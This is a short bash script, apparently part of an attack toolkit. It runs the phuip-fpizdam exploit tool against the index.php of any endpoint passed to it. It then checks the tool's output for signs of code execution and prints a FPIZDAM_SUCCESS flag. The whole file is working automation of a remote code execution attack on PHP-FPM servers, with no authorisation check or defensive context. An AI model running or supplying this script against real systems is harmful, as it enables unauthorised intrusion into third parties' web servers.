#!/bin/bash
# PHP-FPM — Explore mode phuip-fpizdam for likely-vulnerable targets
# Usage: explore_fpizdam.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

echo "[*] 探索模式 phuip-fpizdam..."
output=$(phuip-fpizdam "${ENDPOINT}/index.php" 2>&1)
echo "$output"
if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
  echo "FPIZDAM_SUCCESS"
fi
